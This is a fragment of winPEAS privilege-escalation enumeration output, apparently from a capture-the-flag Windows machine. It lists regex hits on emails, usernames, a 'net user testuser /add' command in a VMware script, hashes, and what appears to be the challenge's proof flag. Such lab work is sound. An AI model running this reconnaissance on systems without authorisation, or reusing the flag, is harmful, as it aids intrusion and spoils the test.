+???????????? Found Misc-Emails Regexes
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: jloup@gzip.org
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: madler@alumni.caltech.edu
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: freetype@nongnu.org
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: freetype-devel@nongnu.org
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: ran234@gmail.com
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: currojerez@riseup.net
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: joeyadams3.14159@gmail.com
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: lastguru@mail.ru
+C:\Users\Destitute\AppData\Local\Microsoft\OneDrive\17.3.6816.0313\ThirdPartyNotices.txt: mokhin@bog.msu.ru
+
+???????????? Found Misc-Usernames Regexes
+C:\Users\All Users\VMware\VMware CAF\pme\install\caf-dbg.ps1: username = $null,
+
+???????????? Found Misc-Net user add Regexes
+C:\Users\All Users\VMware\VMware CAF\pme\scripts\setUpVgAuth.bat: net user testuser /add
+
+???????????? Found Misc-Generic API Key Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\AC\AppCache\2TP015FD\1\C__Windows_SystemApps_Microsoft.Windows.Cortana_cw5n1h2txyewy_cache_Desktop_16[1].txt: apitalize:"autocapitalize"
+
+???????????? Found Raw Hashes-md5 Regexes
+C:\Users\Destitute\Desktop\proof.txt: c1c589dcc1f2796126713eaa39eae7eb
+
+???????????? Found Raw Hashes-sha1 Regexes
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: .f22abfeae27a67446927d078890381efc546d3e1                                                                                                                                    
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: .4efc125e5bdfe64bf86cc73a85a9d56ebf10231c                                                                                                                                    
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: .83453a3d886e527a470b5bb8291dd338de4b1e44                                                                                                                                    
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: .df14959794357d12ed676dec14aea1901d749645                                                                                                                                    
+C:\Users\Destitute\AppData\Local\Packages\Microsoft.Windows.Cortana_cw5n1h2txyewy\LocalState\ConstraintIndex\Input_{632d8ae0-cc75-4a83-916f-63ba63930509}\appsglobals.txt: .3427d172d24e84772d70149f8c9b4046fc37354c                                                                                                                                    
+
+       /---------------------------------------------------------------------------------\                                                                                  
+       |                             Do you like PEASS?                                  |                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                  
+       |         Get the latest version    :     https://github.com/sponsors/carlospolop |                                                                                  
+       |         Follow on Twitter         :     @hacktricks_live                        |                                                                                  
+       |         Respect on HTB            :     SirBroccoli                             |                                                                                  
+       |---------------------------------------------------------------------------------|                                                                                  
+       |                                 Thank you!                                      |                                                                                  
+       \---------------------------------------------------------------------------------/                                                                                  
+                                                                                               
